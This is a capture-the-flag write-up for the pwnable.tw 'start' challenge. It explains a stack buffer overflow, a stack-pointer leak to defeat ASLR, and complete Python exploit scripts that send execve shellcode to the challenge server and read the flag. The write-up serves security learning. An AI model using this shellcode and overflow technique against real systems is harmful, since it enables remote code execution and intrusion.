# [100 points] Welcome

This is the first exercise from pwnable.tw

First things first, we analyze the binary, and quickly realize that it prints a message with syscall 4, reads input using a syscall 3, and puts the result into stack.

We notice that the buffer we get is 20 bytes large, but we can read in 60 bytes, meaning that this probably is a stack overflow.

First we try to enter 20 characters and look at the stack

```
========================================[stack]========================================

0xffffd2e4:	0x61	0x61	0x61	0x61	0x62	0x62	0x62	0x62
0xffffd2ec:	0x63	0x63	0x63	0x63	0x64	0x64	0x64	0x64
0xffffd2f4:	0x65	0x65	0x65	0x0a   [0x9d	0x80	0x04	0x08] <-- RET addr (EIP)
0xffffd2fc:    [0x00	0xd3	0xff	0xff]  [0x02	0x00	0x00	0x00
0xffffd304:	0xa7	0xd4	0xff	0xff	0xc2	0xd4	0xff	0xff
0xffffd30c:	0x00	0x00	0x00	0x00	0xc3	0xd4	0xff	0xff
0xffffd314:	0xd4	0xd4	0xff	0xff	0xdf	0xd4	0xff	0xff
0xffffd31c:	0xea	0xd4	0xff	0xff] (32 bytes of stack we can abuse)
```

This is the part we write to, here: "aaaabbbbccccddddeee\n" (newline is automatically inserted by the program)

After some quick testing, I realized that ASLR was enabled in the program, which is a problem.

we do however, from running `vmmap` in `gdb`, know that the stack is executable;

```
  0xfffdd000 0xffffe000 rwxp	[stack]
; ^          ^                             the addresses here will be random due to ASLR
```

Now, I could not find a way to solve this with ASLR on, but we can write a script that generates the rest of the code, and we can verify that it works in gdb with randomization off.

```python
payload = ''
payload += "\x90"*20 # padding (NOP)
payload += "\x00\xd3\xff\xff" # addr of exploit code in stack

exp = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload += "\x90"*(36-len(exp))
payload += exp

print payload
```

And when running this in gdb with `r < exp`:

```
gdb-peda$ r < exp
Starting program: /home/igor/Downloads/start < exp
Let's start the CTF:process 28206 is executing new program: /usr/bin/dash
[Inferior 1 (process 28206) exited normally]
Warning: not running
gdb-peda$ 
```

And it works!

However, after this, I simply couldn't figure out how to bypass ASLR, I knew I had read about it before, but I simply lacked the knowledge required.

So, I ended up cheating :/. 

Thanks to a [great writeup by @__cpg on medium](https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6), I figured out how to solve it.

The clue here is to abuse your ability to make the program print the content of its SP (stack pointer).

So the solution involves overflowing the buffer to make the program return to the segment just after pushing the strings onto the stack. This is beacuse we now have the SP! And with that, we can control where we want to return to on the stack, and of course, place our shellcode there.

To get the shellcode, I used a program called `regg2`, which is a `r_egg` frontend for `radare2`, and it allows you to create shellcode very easily.

The command to get the shellcode is now simply `ragg2 -i exec -b 32`. And with some python magic, we can dump this rather easily into the binary with the correct endianness and what-not.

Alright, let's code this out.

```python
import socket
from struct import pack, unpack
from binascii import unhexlify

# ragg2 -i exec -b 32
shellcode = unhexlify('31c050682f2f7368682f62696e89e3505389e199b00bcd80')

sck = socket.create_connection(('chall.pwnable.tw', 10000))

# Initial message from server
sck.recv(1024)
```

First we have some boring setup, but it's obviously necessary.

```python
# Overflow buffer, and set RET addr (ESP) to [MOV ECX,ESP]. Remember little-endianness
sck.send(b'\x90'*20 + pack("<I", 0x08048087))
```

This is where the first magic happens; we overflow the buffer with _nop_s, and then set the RET address to the specified location:

```
        ; addr   hex             instr.     arguments

        08048082 68 4c 65        PUSH       "Let'"
                 74 27
        08048087 89 e1           MOV        ECX,ESP ; <----- Here, to be exact
        08048089 b2 14           MOV        DL,0x14
        0804808b b3 01           MOV        BL,0x1
        0804808d b0 04           MOV        AL,0x4
```

Now, let's see what we get...

```
# Now we receive the ESP as we forced it to print it
esp, = unpack("<I", sock.recv(1024)[:4])

print("============================")
print(f"  SP leaked: {hex(esp)}")
print(f"  New RET addr: {hex(esp + 20)}")
print("============================")
```

And run.

```
============================
  SP leaked: 0xffee6200
  New RET addr: 0xffee6214
============================
```

It works!

And now, let's finally create the payload and get ready to ship it off.

```
# Now we prepare the payload
payload = b''

payload += b'\x00'*20 # Padding
payload += pack('<I', esp + 20) # New return addr
payload += shellcode

sock.send(payload)
sock.send(b'find / -name "*flag*"\n')

print("Result received!")
print(f"Filename: {sock.recv(4096).decode()}")
```

This should all be pretty self-explanatory, and now, let's see if it works!

```
============================
  SP leaked: 0xffee6200
  New RET addr: 0xffee6214
============================
Result received!
Filename:
     .
     .
     .
/home/start/flag
```

Wow, it works! All that's left now is to `cat` the file, and we're done.

Final code:

```python
import socket
from struct import pack, unpack
from binascii import unhexlify

# ragg2 -i exec -b 32
shellcode = unhexlify('31c050682f2f7368682f62696e89e3505389e199b00bcd80')

sock = socket.create_connection(('chall.pwnable.tw', 10000))

# Initial message from server
sock.recv(1024)

# Overflow buffer, and set RET addr (ESP) to [MOV ECX,ESP]. Remember little-endianness
sock.send(b'\x90'*20 + pack("<I", 0x08048087))

# Now we receive the ESP as we forced it to print it
esp, = unpack("<I", sock.recv(1024)[:4])

print("============================")
print(f"  SP leaked: {hex(esp)}")
print(f"  New RET addr: {hex(esp + 20)}")
print("============================")

# Now we prepare the payload
payload = b''

payload += b'\x00'*20 # Padding
payload += pack('<I', esp + 20) # New return addr
payload += shellcode

sock.send(payload)
#sock.send(b'find / -name "*flag*"\n')
sock.send(b'cat /home/start/flag\n')

print("Result received!")
print(f"Filename: {sock.recv(4096).decode()}")
```
